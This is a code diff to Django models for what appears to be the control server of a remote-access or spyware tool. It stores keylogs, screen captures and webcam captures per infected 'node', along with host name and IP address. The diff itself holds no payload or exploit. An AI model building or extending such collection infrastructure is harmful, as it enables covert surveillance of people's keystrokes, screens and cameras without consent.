@@ -1,10 +1,19 @@
 from django.db import models
-from django.utils import timezone
+from django.utils import timezone, dateformat
 import datetime
 
 
-def get_path(instance, filename):
-    return f'nodes/{instance.node.uuid}/keylogs/{timezone.now()}.log'
+def get_keylog_path(instance, filename):
+    date_string = dateformat.format(timezone.now(), "%Y-%m-%d_%G-%i-%s")
+    return f'nodes/{instance.node.uuid}/keylogs/{date_string}.log'
+
+
+def get_image_path(instance, filename):
+    date_string = dateformat.format(timezone.now(), "%Y-%m-%d_%G-%i-%s")
+    if instance.type == "screencapture":
+        return f'nodes/{instance.node.uuid}/screenCapture/{date_string}.png'
+    elif instance.type == "camcapture":
+        return f'nodes/{instance.node.uuid}/camCapture/{date_string}.png'
 
 
 # Node related models
@@ -12,7 +21,7 @@ class Node(models.Model):
     # Connection Info
     uuid = models.CharField(max_length=128, unique=True,
                             null=False, blank=False)
-    hash_sum = models.CharField(max_length=512, unique=True)
+    hash_sum = models.CharField(max_length=512)
     host_name = models.CharField(max_length=512)
     ipv4 = models.GenericIPAddressField(protocol='IPv4', null=True, blank=True)
     first_seen = models.DateTimeField(auto_now_add=True)
@@ -114,7 +123,27 @@ class Keylog(models.Model):
     timestamp = models.DateTimeField(auto_now_add=True)
 
     log_file = models.FileField(
-        upload_to=get_path, null=True, blank=True, max_length=512)
+        upload_to=get_keylog_path, max_length=512)
 
     def __str__(self):
         return f'{self.node.uuid}:{self.timestamp}'
+
+
+class Capture(models.Model):
+    node = models.ForeignKey(
+        Node, related_name='images', on_delete=models.CASCADE)
+
+    capture_types = (
+        ('screencapture', 'ScreenCapture'),
+        ('camcapture', 'CamCapture'),
+    )
+
+    type = models.CharField(
+        max_length=32, choices=capture_types, default='screenshot')
+
+    capture = models.ImageField(
+        upload_to=get_image_path, max_length=512)
+    timestamp = models.DateTimeField(auto_now_add=True)
+
+    def __str__(self):
+        return f'{self.node.uuid}:{self.type}:{self.timestamp}'
